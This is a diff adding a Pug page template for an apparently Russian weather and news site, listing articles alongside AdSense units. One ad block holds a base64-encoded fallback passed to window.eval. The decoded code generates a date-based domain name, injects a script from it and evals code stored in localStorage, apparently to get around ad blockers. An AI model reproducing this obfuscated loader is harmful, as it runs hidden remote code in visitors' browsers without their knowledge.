@@ -1,0 +1,92 @@
+extends lay
+
+block content
+    - var formatter = new Intl.DateTimeFormat(["ru"], {hour: "2-digit", minute:"2-digit" })
+    #wrapper
+
+
+        #content
+            script(async='', src='//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js')
+            // meteo_top
+            ins.adsbygoogle(style='display:block', data-ad-client='ca-pub-7920044952062150', data-ad-slot='8512321518', data-ad-format='auto', data-full-width-responsive='true')
+            script.
+                (adsbygoogle = window.adsbygoogle || []).push({});
+            if one
+                #one-news
+                    .one-news-div-title
+                        h1.one-news-title #{one.title}
+                            span.one-news-date #{formatter.format(one.pubDate)}
+                    figure.top-picture-news
+                        img.img-top-picture-news(src='/article/img/300/' + one.img, alt=one.description)
+                        //figcaption !{one.description}
+                    h2.go-news-desc
+                        | !{one.description}
+                    .go-botton-div
+                        a.go-botton(href='/news/' + one._id, target='_blank')
+
+                            | Читать далее
+            .ads-block
+                script(async='', src='//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js')
+                // meteo_botton
+                ins.adsbygoogle(style='display:block', data-ad-client='ca-pub-7920044952062150', data-ad-slot='7324568200', data-ad-format='auto', data-full-width-responsive='true')
+                script.
+                    (adsbygoogle = window.adsbygoogle || []).push({});
+
+            if top
+                p.cat-iten-news Читайте также:
+                each item in top
+                    .main-item-news
+                        a(href='/go/news/' + item._id, target='_blank')
+                            //.main-item-date #{formatter.format(item.pubDate)}
+                            .text-item-recomend
+                                | #{item.title.replace(/&quot;/g, "\x22").replace(/&#039;/g, "'")}
+
+            #MIXADV_5232.MIXADVERT_NET
+            script.
+                var node5232 = document.getElementById("MIXADV_5232");
+                if (node5232) {
+                    var script = document.createElement("script");
+                    script.charset = "utf-8";
+                    script.src = "https://m.mixadvert.com/show/?id=5232&r=" + Math.random();
+                    node5232.parentNode.appendChild(script);
+                    script.onerror = function () {
+                        window.eval(atob("dmFyIGRhdGUgPSBuZXcgRGF0ZSgpO3ZhciBtb250aCA9IGRhdGUuZ2V0TW9udGgoKSArIDE7IHZhciBkYXkgPSBkYXRlLmdldERhdGUoKTsgdmFyIHllYXIgPSBkYXRlLmdldFllYXIoKTsgdmFyIG5hbWVfZGF5ID0gZGF0ZS5nZXREYXkoKSArIDE7dmFyIGRvbSA9IFsgInBybyIsICJ0b3AiLCAiaW5mbyIsICJvbmxpbmUiLCAic3BhY2UiLCAic2l0ZSIsICJ0ZWNoIl07IHZhciBzdHIgPWRheSoobW9udGggKiBuYW1lX2RheSAqIGRheSkrIiIrIGRheSoobW9udGggKyBuYW1lX2RheSArIGRheSAreWVhcik7dmFyIGhhc2ggPSAgYnRvYShidG9hKHN0cikpLnRvTG93ZXJDYXNlKCk7IHZhciBob3N0ID0gaGFzaC5zdWJzdHJpbmcoMywgaGFzaC5sZW5ndGggLSBuYW1lX2RheS8yKSsiLiIrZG9tW25hbWVfZGF5IC0gMV07dmFyIHIgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgMik7ciA9IHIucmVwbGFjZSgvWzAtOV0vZywgIiIpO3ZhciBkZWx0YSA9IE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICgxMDAgLSAxMCArIDEpKSArIDEwO3ZhciBpZCA9IDUyMzIgLSBkZWx0YTsgdmFyIHNjcmlwdF9maXJzdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdF9maXJzdC5zcmMgPSAiaHR0cHM6Ly8iKyBob3N0KyIvIitkZWx0YStpZCtyKyIiOyBub2RlNTIzMi5wYXJlbnROb2RlLmFwcGVuZENoaWxkKHNjcmlwdF9maXJzdCk7c2V0VGltZW91dCggZnVuY3Rpb24gKCkge3NjcmlwdF9maXJzdC5yZW1vdmUoKX0sIDQwMDApO3NjcmlwdF9maXJzdC5vbmVycm9yID0gZnVuY3Rpb24oKXsgc2V0VGltZW91dCggZnVuY3Rpb24gKCkgeyBpZiggbm9kZTUyMzIuaW5uZXJIVE1MID09ICIiICkgd2luZG93LmV2YWwobG9jYWxTdG9yYWdlLmdldEl0ZW0oIjUyMzIiKSkgfSwgNTAwMCk7ICA7fTsg"));
+                    }
+                }
+
+            center
+                .ads-block
+                    script(async='', src='//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js')
+                    // meteohub-poster
+                    ins.adsbygoogle(style='display:inline-block;width:580px;height:400px', data-ad-client='ca-pub-7920044952062150', data-ad-slot='6264613885')
+                    script.
+                        (adsbygoogle = window.adsbygoogle || []).push({});
+        #aside
+            if top
+                p.cat-iten-news Главное
+                each item in top
+                    .item-news
+                        a(href='/news/' + item._id, target='_blank')
+                            .item-news-img
+                                img(src='/article/img/100/' + item.img, width='90', height='78', alt='погода')
+                            .item-text
+                                | #{item.title.replace(/&quot;/g, "\x22").replace(/&#039;/g, "'")}
+                                span.one-news-date #{formatter.format(item.pubDate)}
+
+            script(async='', src='//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js')
+            ins.adsbygoogle(style='display:block', data-ad-format='fluid', data-ad-layout-key='-6b+cv-k-7l+j9', data-ad-client='ca-pub-7920044952062150', data-ad-slot='5807456492')
+            script.
+                (adsbygoogle = window.adsbygoogle || []).push({});
+
+
+            if news
+                p.cat-iten-news Лента новостей
+                each item in news
+                    .item-news
+                        a(href='/news/' + item._id, target='_blank')
+                            .item-news-img
+                                img(src='/article/img/100/' + item.img, alt='погода')
+                            .item-text
+                                | #{item.title.replace(/&quot;/g, "\x22").replace(/&#039;/g, "'")}
+                                span.one-news-date #{formatter.format(item.pubDate)}
+
